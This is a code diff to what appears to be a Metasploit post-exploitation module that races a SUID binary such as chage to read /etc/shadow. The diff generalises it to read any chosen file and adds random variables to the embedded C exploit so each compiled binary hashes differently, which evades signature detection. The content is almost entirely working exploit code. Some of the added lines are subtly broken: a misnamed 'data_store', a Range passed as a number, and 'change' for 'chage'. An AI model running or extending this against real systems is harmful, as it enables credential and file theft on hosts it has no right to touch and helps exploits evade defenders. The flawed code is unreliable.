@@ -23,7 +23,7 @@ class MetasploitModule < Msf::Post
           NULL, allowing sensitive file disclosure from privileged SUID
           binaries such as chage.
 
-          This module targets chage to disclose /etc/shadow.
+          By default this module targets change to disclose /etc/shadow.
 
           This module performs information disclosure only and does not
           create a new session.
@@ -54,6 +54,10 @@ class MetasploitModule < Msf::Post
         'WRITABLE_DIR',
         [ true, 'Writable directory for exploit compilation', '/tmp' ]
       ),
+      OptString.new(
+        'TARGET_FILE',
+        [ true, 'File exploit will read. Default is /etc/shadow', '/etc/shadow']
+        ), 
 
       OptInt.new(
         'RACE_ROUNDS',
@@ -131,6 +135,11 @@ class MetasploitModule < Msf::Post
   end
 
   def exploit_source
+    target_file = datastore['TARGET_FILE']
+
+    # we add a random variable name. Adding entropy to the source makes the compiled exploits hash differemt every time. 
+    random_var = rand_text_alphanumeric(5..10)
+    random_value = [0..1337].sample
     <<~EOF
       #define _GNU_SOURCE
 
@@ -154,6 +163,8 @@ class MetasploitModule < Msf::Post
 
       int main(int argc, char **argv)
       {
+          int #{random_var} = #{random_value};
+          
           int rounds = 500;
 
           if (argc > 1) {
@@ -220,7 +231,7 @@ class MetasploitModule < Msf::Post
                           path[n] = 0;
                       }
 
-                      if (strstr(path, "/etc/shadow")) {
+                      if (strstr(path, "#{target_file}")) {
 
                           stolen = s;
 
@@ -330,15 +341,15 @@ class MetasploitModule < Msf::Post
 
     if output.include?('$')
 
-      print_good('Successfully disclosed /etc/shadow')
+      print_good("Successfully disclosed #{data_store['TARGET_FILE']}")
 
       loot = store_loot(
         'linux.shadow',
         'text/plain',
         session,
         output,
-        'shadow.txt',
-        'Disclosed /etc/shadow'
+        'loot_cve_2026_46333.txt',
+        "Disclosed #{datastore['TARGET_FILE']}"
       )
 
       print_good("Loot stored at: #{loot}")
